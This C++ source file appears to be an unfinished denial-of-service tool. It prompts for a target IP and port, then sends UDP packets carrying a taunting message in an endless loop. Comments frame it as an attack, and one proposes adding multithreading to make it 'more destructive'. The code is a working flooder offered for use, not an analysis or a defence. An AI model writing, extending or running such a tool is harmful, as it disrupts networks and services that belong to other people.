#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <limits>
#include <thread>
#include "textcolors.h"

#define COLOR REDHB

struct SocketInfo {
    int socket;
}; 

struct StoredData {

    std::string targetIpAddress;
    int targetPortNumber;

}; 

class DisplayLogo {

    public:

        DisplayLogo(const std::string& toolName) {

            DisplayToolName(toolName);
        }
    
        void DisplayToolName(const std::string& toolName) {
            std::cout << toolName;
        }
};

class UserInput {

    public:
        UserInput(struct StoredData& storedDataObj) {

            getUserInput(storedDataObj);

        }; 

        void checkValidInput() {

            if (std::cin.fail()) {
                std::cerr << BRED "Invalid Input!!";
                std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
                std::cin.clear();
                exit(EXIT_FAILURE);
            }
            
        }

        int getPortTarget() {

            int input { 0 };
            std::cout << COLOR "Enter Target Port Number: " reset;
            std::cin >> input; 
            std::cin.ignore();
            checkValidInput();

            return input;
        }
        

        std::string getIpTarget() {

            std::string input{ "" };
            std::cout << COLOR "Enter Target IP: " reset;
            std::getline(std::cin, input);
            checkValidInput();

            return input;
        }

        void getUserInput(struct StoredData& storedDataObj) {
            storedDataObj.targetIpAddress = getIpTarget();
            storedDataObj.targetPortNumber = getPortTarget();
        }
};

class SocketConfig {

    public:

    SocketConfig(struct SocketInfo& socketInfoObj, struct sockaddr_in& servaddr, struct StoredData& storedDataObj) {

        socketInitialization(socketInfoObj.socket);
        socketBind(servaddr, storedDataObj);
    }

    void socketInitialization(int& sockfd) {

        if ( (sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0 ) {

            std::cerr << BRED "Socket failed to initialize" << std::endl;
            exit(EXIT_FAILURE); 
        }
    }

    /*

        ! Removed binding because it's unnecesarry, remove unused parameters later on
    
    */

    void socketBind(struct sockaddr_in& servaddr, struct StoredData& storedDataObj) {

        memset(&servaddr, 0, sizeof(servaddr));
        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons(static_cast<uint16_t>(storedDataObj.targetPortNumber));

        if(inet_pton(AF_INET, storedDataObj.targetIpAddress.c_str(), &servaddr.sin_addr) <= 0) {
            std::cerr << BRED "Invalid IP Address Format" << std::endl;
            exit(EXIT_FAILURE);
        }

        std::cout << "Working!!" << std::endl;
    }
};

/*
    !  Here The fun begins

    ! Lacks Multi-threading for the multiple instance of DESTROY function for more destructive attack

*/ 

class Kill_em_ALL {

    public:


        Kill_em_ALL(struct SocketInfo& sockInfoObj, struct sockaddr_in& servaddr) {
            DESTROY(sockInfoObj, servaddr);
        }
        
        void DESTROY(struct SocketInfo& sockInfoObj, struct sockaddr_in& servaddr) {    

            std::string data_to_transfer = "RABITS ARE INVADING THEY ARE ATTACKING YOUR NETWORK!!!!!!";


            while (true) {

                ssize_t byteSent = sendto(sockInfoObj.socket, data_to_transfer.c_str(), data_to_transfer.size(),0,
                                      (struct sockaddr *)&servaddr, sizeof(servaddr));

                if (byteSent < 0) {
                    std::cerr << BRED "Failed to send message! Error: " << strerror(errno) << std::endl;
                    close(sockInfoObj.socket);
                    exit(EXIT_FAILURE);
                }

                std::cout << BRED" ThE RaBBiTs " BBLU "ArE On " BYEL " To BrEaK ThE " BMAG " SYsTEm! "<< std::endl;
            }

            close(sockInfoObj.socket);
        }
};


int main([[maybe_unused]]int argc, [[maybe_unused]] char **argv) {

    extern const std::string toolName;

    struct sockaddr_in servaddr; 

    struct SocketInfo socketInfoObj = { 0 };
    struct StoredData storedDataObj = { " " , 0 };


    DisplayLogo displayLogoObj(toolName);
    UserInput userInputObj(storedDataObj);
    SocketConfig socketConfigObj(socketInfoObj, servaddr, storedDataObj);
    Kill_em_ALL(socketInfoObj, servaddr);

    return EXIT_SUCCESS;
}


/*


UNFINISHED!!!!!!

*/